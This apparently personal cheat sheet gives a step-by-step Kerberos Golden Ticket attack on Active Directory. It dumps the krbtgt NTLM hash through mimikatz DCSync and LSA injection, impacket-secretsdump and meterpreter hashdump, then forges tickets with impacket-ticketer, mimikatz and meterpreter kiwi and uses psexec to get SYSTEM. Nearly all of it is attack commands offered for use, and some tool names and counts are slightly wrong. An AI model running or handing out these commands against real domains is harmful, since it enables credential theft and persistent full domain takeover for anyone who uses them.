------------------------------------------
#For releasing Golden Ticket attack we need:

#1. Domain SPN
#2. Domain SID
#3. NTLM-hash of the 'krbtgt' Domain user
#4. Username for operator work(even if no such user)***
------------------------------------------

#1 STEP: Finding Domain SID.

PS> Get-ADDomain



#2 STEP: Get NTLM hash of krbtgt account. (That's step we can be done and remotely, and locally)

------------------------------------------
#LOCALLY

#We have 2 ways to release attack: DCSync attack(use SAM - Security Account Managers) or use module 'securlsa'.

#DCSync:

mimikatz# lsadump::dcsync /user:krbtgt

#SAM:

mimikatz# privilege::debug

mimikatz# lsadump::lsa /inject /name:krbtgt

#Securlsa:

mimikatz# securlsa::krbtgt

------------------------------------------
REMOTE

Remote attack also can be release with DCSync using, or through open meterpreter session.

With Impacket module:

root@kali#/ impacket-secretsdump domain.dom/root@192.168.1.10

#Meterpreter:

meterpreter> hashdump

meterpreter> dcsync_ntlm krbtgt    (for this case it necessary download 'kiwi' module)

------------------------------------------

#Now we can create Golden ticket.



#3 STEP: Create Golden Ticket.
------------------------------------------
#We can create and use Golden Ticket in 3 ways:

1. Impacket module 'ticketer' (remote)

2. Mimikatz

3. Meterpreter

4. Rubeus
------------------------------------------

#1. Ticketer module:

#Firstly, we should create a ticket

root@kali#/ impacket-ticketer -nthash <hash_from_previous_step> -domain-sid <DC_SID> -domain domain.dom anyuser   ***(we can set any user, even if this user doen't exsist)***

#After completing this command you will have ticket 'anyuser.ccache'. Let's export it with command:

root@kali#/ export KRB5CCNAME=anyuser.ccache

#And now we can try to connect using ticket and PsExec tool:

root@kali#/ impacket-psexec -k -no-pass [domain]/[user]@[hostname]

# ****And get remote SYSTEM privileges****

#2. Mimikatz

#Create ticket:

mimikatz# kerberos::golden /domain:domain.local /sid:<SID> /user:<someuser> /id:500 /ptt

#Now we should check, that ticket was successfully cached in memory:

mimikatz# misc::cmd      (command for calling cmd from mimikatz session)

#And then:

C:\ klist      (you should find your cached Golden ticket)

#3. Meterpreter

#In this way we will use module 'kiwi'.

#Firstly, let's create ticket:

meterpreter> golden_ticket_create -d domain.local -u <someuser> -s <SID>

#And now, let's apply it:

meterpreter> kerberos_ticket_use /path/to/ticket

#For the last step, check that ticket was succesfully uploaded:

meterpreter> kerberos_ticket_list

#That's all.
